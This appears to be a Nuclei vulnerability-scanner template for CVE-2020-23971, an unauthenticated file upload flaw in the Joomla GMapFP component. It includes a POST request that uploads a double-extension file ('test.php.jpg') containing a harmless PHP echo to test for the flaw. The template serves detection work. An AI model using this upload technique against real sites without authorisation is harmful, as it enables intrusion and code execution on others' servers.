id: CVE-2020-23971

info:
  name: Joomla Component GMapFP J3.30pro Insecure Permissions
  author: ProjectDiscoveryAI
  severity: high
  description: |
    gmapfp.org Joomla Component GMapFP J3.30pro is affected by Insecure Permissions. An attacker can access the upload function without authenticating to the application and also can upload files due the issues of unrestricted file uploads which can be bypassed by changing the content-type and name file to double extensions.
  impact: |
    An attacker can exploit this vulnerability to gain unauthorized access to sensitive data.
  remediation: |
    Update to the latest version of Joomla Component GMapFP J3.30pro to fix insecure permissions.
  reference:
    - https://github.com/404notf0und/CVE-Flow
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2020-23971
    cwe-id: CWE-276
    epss-score: 0.00273
    epss-percentile: 0.68748
    cpe: cpe:2.3:a:gmapfp:gmapfp:j3.30:*:*:*:pro:joomla\!:*:*
  metadata:
    vendor: gmapfp
    product: gmapfp
    framework: joomla\!

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?option=com_gmapfp&controller=upload&format=raw"

    headers:
      Content-Type: "multipart/form-data"

    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="file"; filename="test.php.jpg"
      Content-Type: application/octet-stream

      <?php echo 'Vulnerable to CVE-2020-23971'; ?>
      ------WebKitFormBoundary--
    matchers:
      - type: word
        words:
          - "test.php.jpg"
        part: body
